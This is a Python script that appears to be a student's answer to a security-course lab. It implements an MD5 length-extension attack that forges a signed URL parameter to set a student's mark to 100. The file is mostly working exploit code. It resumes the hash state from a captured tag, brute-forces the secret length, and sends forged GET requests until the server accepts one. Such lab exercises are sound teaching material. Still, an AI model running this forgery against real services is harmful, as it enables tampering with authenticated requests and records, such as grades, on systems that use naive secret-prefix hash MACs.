import httplib, urlparse, urllib
from md5p import md5, padding

# =============================================
# ========= write your code below  ============
# =============================================

def attack(url):
    # parameter url is the attack url you construct
    parsed = urlparse.urlparse(url)

    # getting student id
    sid = url.split('sid=')[1]
    idhash = url.split('tag=')[1].split('&sid=')[0]


    # ------------- Set hash state ------------- #
    mdhash = md5(state=idhash.decode('hex'), count=512)
    # ------------- end of set hash state ------------- #


    # ------------- updating hash for change request ------------- #
    mdhash.update('&sid=' + sid + '&mark=100')
    markhash = mdhash.hexdigest()
    # ------------- end of change state ------------- #


    # ------------- let's try changing the mark ------------- #
    i = 7
    status = -1
    while (status != 200 and i < 21):
      pads = padding(len('&sid=' + sid) * 8 + i * 8)

      temp = '?tag=' + markhash + '&sid=' + sid + urllib.quote(pads)

      temp += '&sid=' + sid + '&mark=100'

      httpconn = httplib.HTTPConnection(parsed.hostname, parsed.port)

      httpconn.request("GET", parsed.path + temp)

      mark = httpconn.getresponse()

      status = mark.status

      if status != 200:
        i += 1
    # ------------- end of change marks ------------- #
    
    # return the url that made the attack successful 
    return parsed.scheme + "://" + parsed.netloc + parsed.path + temp


# =============================================
# ===== do not modify the code below ==========
# =============================================
            
if __name__ == "__main__":
   import os, sys, getopt
   def usage():
        print ('Usage:    ' + os.path.basename(__file__) + ' url ')
        sys.exit(2)
   try:
      opts, args = getopt.getopt(sys.argv[1:],"h",["help"])
   except getopt.GetoptError as err:
      print(err)
      usage()
   # extract parameters
   url = args[0] if len(args) > 0 else None
   # check arguments
   if (url is None):
       print('url is missing\n')
       usage()
   # run the command
   print(attack(url))